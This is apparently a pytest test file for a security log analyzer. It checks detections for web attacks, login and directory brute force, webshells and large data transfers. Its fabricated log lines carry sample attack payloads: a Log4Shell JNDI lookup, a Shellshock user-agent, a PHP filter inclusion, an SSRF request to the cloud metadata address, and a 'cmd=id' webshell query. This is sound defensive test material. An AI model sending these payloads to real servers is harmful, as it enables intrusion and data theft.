from pathlib import Path

from soc_analyzer import analyze, analyze_files
from soc_analyzer.detections import detect_http
from soc_analyzer.detections_web import (detect_directory_brute_force, detect_large_transfer,
                                         detect_web_login_brute_force, detect_webshell)
from soc_analyzer.parsers import parse_lines

SAMPLE = Path(__file__).resolve().parent.parent / "samples" / "web_attacks.log"


def req(sec, path, status=200, method="GET", size=500, ip="9.9.9.9", agent="Mozilla/5.0"):
    m, s = divmod(sec, 60)
    return f'{ip} - - [21/Mar/2024:10:{m:02d}:{s:02d} +0000] "{method} {path} HTTP/1.1" {status} {size} "-" "{agent}"'


def test_bytes_column_is_parsed():
    [e] = parse_lines([req(0, "/", size=1234)])
    assert e.detail["bytes"] == 1234
    [e] = parse_lines([req(0, "/", size="-")])
    assert e.detail["bytes"] == 0


# ── New payload signatures ───────────────────────────────────────

def test_payloads_in_user_agent_and_new_signatures():
    lines = [req(0, "/", agent="${jndi:ldap://x.invalid/a}"),
             req(1, "/cgi-bin/x", agent="() { :; }; echo t"),
             req(2, "/index.php?page=php://filter/resource=config"),
             req(3, "/fetch?url=http://169.254.169.254/latest/")]
    [alert] = detect_http(parse_lines(lines))
    assert set(alert["details"]["payloads"]) == {"log4shell", "shellshock", "file_inclusion", "ssrf"}
    assert alert["severity"] in ("HIGH", "CRITICAL")


def test_redirect_parameter_is_not_file_inclusion():
    lines = [req(i, f"/oauth/callback?next=https://app.example/home&i={i}") for i in range(5)]
    assert detect_http(parse_lines(lines)) == []


# ── Login brute force ────────────────────────────────────────────

def test_web_login_brute_force_then_success():
    lines = [req(i * 2, "/wp-login.php", 200, "POST") for i in range(12)] + [req(30, "/wp-login.php", 302, "POST")]
    [alert] = detect_web_login_brute_force(parse_lines(lines))
    assert alert["severity"] == "CRITICAL" and alert["details"]["successful_logins"] == 1
    assert alert["mitre"]["technique_id"] == "T1078"


def test_single_normal_login_is_quiet():
    lines = [req(0, "/login", 401, "POST"), req(5, "/login", 302, "POST")]
    assert detect_web_login_brute_force(parse_lines(lines)) == []


# ── Directory brute force ────────────────────────────────────────

def test_many_404s_is_directory_brute_force():
    lines = [req(i, f"/word{i}", 404, agent="gobuster/3.6") for i in range(35)] + [req(40, "/admin/", 200)]
    [alert] = detect_directory_brute_force(parse_lines(lines))
    assert alert["mitre"]["technique_id"] == "T1595.003"
    assert alert["details"]["discovered_paths"] == ["/admin/"]


def test_a_few_broken_links_are_quiet():
    lines = [req(i * 30, f"/old-page-{i}", 404) for i in range(10)]
    assert detect_directory_brute_force(parse_lines(lines)) == []


# ── Webshell ─────────────────────────────────────────────────────

def test_command_parameter_on_script_is_webshell():
    [alert] = detect_webshell(parse_lines([req(0, "/uploads/a.php?cmd=id")]))
    assert alert["severity"] == "CRITICAL" and alert["mitre"]["technique_id"] == "T1505.003"


def test_normal_php_post_is_not_webshell():
    lines = [req(i, "/contact.php", 200, "POST") for i in range(5)]
    assert detect_webshell(parse_lines(lines)) == []


# ── Large transfer ───────────────────────────────────────────────

def test_large_database_dump_is_flagged():
    [alert] = detect_large_transfer(parse_lines([req(0, "/backup/db.sql", size=200 * 1024 * 1024)]))
    assert alert["severity"] == "HIGH"
    assert alert["details"]["sensitive_files"] == ["/backup/db.sql"]


def test_large_iso_download_is_expected():
    assert detect_large_transfer(parse_lines([req(0, "/downloads/os.iso", size=3 * 1024 ** 3)])) == []


# ── Sample end to end ────────────────────────────────────────────

def test_web_sample_end_to_end():
    report = analyze_files([SAMPLE])
    types = {(a["ip"], a["type"]) for a in report["alerts"]}
    assert ("45.33.10.5", "WEB_LOGIN_BRUTE_FORCE") in types
    assert ("45.33.10.5", "HTTP_SCAN") not in types                       # duplicate suppressed
    assert ("45.33.10.6", "WEB_DIRECTORY_BRUTE_FORCE") in types
    assert ("45.33.10.8", "WEBSHELL") in types
    assert ("45.33.10.9", "WEB_LARGE_TRANSFER") in types
    assert "192.168.1.20" not in {a["ip"] for a in report["alerts"]}      # normal user stays quiet
    assert report["summary"]["breaches"] == 2                              # web login success + webshell commands
    assert all(a["severity"] != "CRITICAL" for a in report["alerts"]
               if a["type"] == "HTTP_SCAN" and not a["details"]["payloads"])


def test_report_still_works_without_web_lines():
    assert analyze(["hello"])["alerts"] == []
